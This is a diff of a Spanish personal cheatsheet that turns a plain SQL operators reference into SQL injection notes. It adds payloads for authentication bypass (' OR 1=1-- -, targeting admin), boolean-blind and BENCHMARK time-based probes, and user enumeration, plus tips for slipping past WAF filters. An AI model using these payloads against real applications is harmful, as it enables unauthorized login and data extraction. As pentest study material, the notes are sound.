@@ -1,17 +1,17 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/cheatsheet
   - vuln/sqli
   - technique/execution
   - asset/database
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: CheatSheet
 linked:
-  - "[[SQL Commands]]"
+  - '[[SQL Commands]]'
 ---
 # SQL - Operadores y Lógica
 
@@ -19,22 +19,44 @@ linked:
 
 ## Cheatsheet
 
-|             **Concepto Clave**             |        **Sintaxis / Operadores**        |                                                     **Ejemplo Práctico**                                                     | **Propósito y Comportamiento**                                                                                                                                                                                                                                                      |
-| :----------------------------------------: | :-------------------------------------: | :--------------------------------------------------------------------------------------------------------------------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-|         <br>**Operadores Lógicos**         |         <br>`AND`, `OR`, `NOT`          |                 <br>`SELECT * FROM usuarios WHERE activo = 1 AND (rol = 'admin' OR rol = 'editor');`<br><br>                 | <br>Combinan o niegan condiciones lógicas. Permiten aplicar múltiples criterios de filtrado simultáneamente en cláusulas como `WHERE` o `HAVING` para obtener conjuntos de datos precisos.<br><br>                                                                                  |
-|     <br>**Operadores de Comparación**      | <br>=, `<>`, `!=`, `>`, `<`, `>=`, `<=` |                       <br>`SELECT nombre, precio FROM productos WHERE stock > 0 AND precio <= 15000;`                        | <br>Evalúan la relación entre dos expresiones. Son fundamentales para acotar registros al comparar valores numéricos, de fecha o de texto y determinar si se cumple una condición. _(Nota: `<>` es el estándar ANSI para "distinto de")._<br><br>                                   |
-| <br>**Operadores de Búsqueda de Patrones** |  <br>`LIKE`, `ILIKE`, `IN`, `BETWEEN`   |    <br>`SELECT * FROM facturas WHERE estado IN ('Pagada', 'Pendiente') AND fecha BETWEEN '2026-01-01' AND '2026-01-31';`     | <br>Facilitan búsquedas flexibles. `LIKE` permite usar comodines (`%`, `_`) para coincidencias parciales de texto, `IN` verifica si un valor está dentro de una lista, y `BETWEEN` evalúa rangos inclusivos.<br><br>                                                                |
-|      <br>**Concatenación de Cadenas**      |     <br><br>\|\| , `CONCAT()`, `+`      |                         <br>`SELECT CONCAT(nombre, ' ', apellido) AS nombre_completo FROM clientes;`                         | <br>Unen dos o más cadenas de texto o columnas en una sola salida. Útiles para formatear y presentar la información de manera legible directamente desde la consulta. _(Nota: `\|\|` es el estándar ANSI, aunque motores como SQL Server usan `+` y MySQL usa `CONCAT()`)._<br><br> |
-|       <br>**Operadores Aritméticos**       |       <br>`+`, `-`, `*`, `/`, `%`       |                <br>`SELECT id_pedido, (precio_unitario * cantidad) AS subtotal FROM detalle_pedidos;`<br><br>                | <br>Ejecutan cálculos matemáticos estándar sobre datos numéricos. Permiten calcular campos derivados en tiempo de ejecución, como subtotales, descuentos o promedios en las filas obtenidas.<br><br>                                                                                |
-|     <br>**Operadores a Nivel de Bits**     |   <br>`&`, \| , `^`, `~`, `<<`, `>>`    | <br>`SELECT id, nombre FROM archivos WHERE (permisos_bitmask & 4) = 4;` _(Ej. verifica si tiene permiso de lectura)_<br><br> | <br>Manipulan los valores a nivel binario. Se utilizan en bases de datos para evaluar campos que almacenan múltiples estados o permisos (flags) empaquetados en un solo número entero, optimizando el espacio.<br><br>                                                              |
+| **Operador / Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `' OR 1=1-- -` | Tautología — todas las filas matchean | Auth bypass clásico. |
+| `' OR 'a'='a'-- -` | Tautología sin números (bypass WAF numeric blacklist) | WAF filtra dígitos. |
+| `' AND 1=2-- -` | Contradiction — siempre false | Validar blind FALSE response. |
+| `' AND 1=1-- -` | Tautología — siempre true | Validar blind TRUE response. |
+| `WHERE x = 1 OR 1=1` | Combina con filtro original | Standard inyección. |
+| `WHERE x = 1 AND (SELECT ...) = 'val'` | Inferencia con subquery | Boolean blind. |
+| `' OR username = 'admin'-- -` | Match exacto del admin | Auth bypass dirigido. |
+| `' OR username LIKE '%adm%'-- -` | Match parcial con wildcard | Enum users sin nombre exacto. |
+| `' OR id IN (1,2,3)-- -` | Match múltiples IDs en una expr | Bulk extraction. |
+| `WHERE id BETWEEN 1 AND 100` | Rango inclusive | Enum secuencial. |
+| `\|\|` (Oracle/PostgreSQL/ANSI) | String concat | Construir payload con `password\|\|':'\|\|user`. |
+| `CONCAT(a,b,c)` (MySQL/MSSQL) | String concat | Mismo, sintaxis MySQL. |
+| `+` (MSSQL) | String concat | Solo MSSQL. |
+| `*`, `/`, `+`, `-`, `%` | Operadores aritméticos | Time-based via `BENCHMARK(1000000, MD5(rand()))`. |
+| `&`, `\|`, `^`, `~`, `<<`, `>>` | Bit operations | Field con flags bitmask. |
 ^sql-logica
 
+### Operadores de comparación
+
+| Operador | Significado | Uso típico |
+|:---:|:---:|:---:|
+| `=` | Equal | `WHERE id = 1` |
+| `<>` o `!=` | Not equal | `WHERE status <> 'deleted'` |
+| `>`, `<`, `>=`, `<=` | Comparación numérica/lexicográfica | `WHERE ASCII(c) > 50` (binary search blind) |
+| `LIKE` | Wildcard match (`%`, `_`) | `WHERE name LIKE 'adm%'` |
+| `ILIKE` (PostgreSQL) | LIKE case-insensitive | Alt LIKE PG. |
+| `IN (...)` | Match contra lista | `WHERE id IN (SELECT id FROM admins)` |
+| `BETWEEN x AND y` | Rango inclusive | `WHERE age BETWEEN 18 AND 65` |
+| `IS NULL` / `IS NOT NULL` | Check NULL | `WHERE password IS NULL` (creds vacías). |
 
 ___
 
 ## Overview
 
-El uso de operadores lógicos, aritméticos y de comparación conforma el núcleo analítico de cualquier base de datos relacional. En el contexto de la manipulación de consultas, estos elementos permiten condicionar el flujo de ejecución, comparar valores para inferir datos y evadir restricciones mediante transformaciones de sintaxis. Entender la precedencia y la lógica booleana subyacente es esencial para construir aserciones verdaderas o falsas en técnicas de inyección ciega, o para consolidar vectores de ataque basados en tautologías.
+Operadores forman el "código" de las inyecciones. Tautologías (`OR 1=1`) y contradicciones (`AND 1=2`) son base de auth bypass y boolean blind. Aritmética + funciones (`BENCHMARK`) se combinan para time-based. Bit ops sirven en sistemas con permisos en bitmask.
 
+WAF bypass: si dígitos filtrados → `'a'='a'`. Si `=` filtrado → `LIKE`. Si `AND`/`OR` filtrados → `&&`/`||` (MySQL).
 
-___
+***
